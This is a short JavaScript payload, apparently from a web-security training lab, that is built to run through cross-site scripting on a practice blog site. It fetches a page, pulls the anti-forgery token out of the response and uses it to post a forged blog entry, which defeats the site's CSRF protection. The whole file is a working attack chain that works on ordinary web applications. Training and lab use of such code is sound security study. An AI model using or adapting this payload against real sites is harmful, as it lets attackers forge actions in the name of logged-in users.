var myxhrGET = new XMLHttpRequest();
var myuriGET = 'http://dojo-basic.sec642.org/index.php?page=add-to-your-blog.php&done=byxss'
myxhrGET.onreadystatechange = function() {
    if (myxhrGET.readyState == XMLHttpRequest.DONE) {
        var myresponse = myxhrGET.response;
        var mytoken = myresponse.getElementsByName("xsrf_token")[0].value;
        do_xsrf(mytoken);
    }
}
myxhrGET.open('GET', myuriGET, true);
myxhrGET.responseType = "document";
myxhrGET.send(null);
function do_xsrf(mytoken){
    var myxhrPOST = new XMLHttpRequest();
    myuriPOST = 'http://dojo-basic.sec642.org/index.php?page=add-to-your-blog.php&done=byxsrf';
    myxhrPOST.open('POST',myuriPOST,true);
    mypayload = 'input=XSRF_For_The_Win&Submit_button=Submit&xsrf_token='+mytoken;
    myxhrPOST.setRequestHeader('Content-type','application/x-www-form-urlencoded');
    myxhrPOST.setRequestHeader('Content-length',mypayload.length);
    myxhrPOST.setRequestHeader('Connection', 'close');
    myxhrPOST.onreadystatechange = function(){
    }
    myxhrPOST.send(mypayload);
}
alert("Success!");
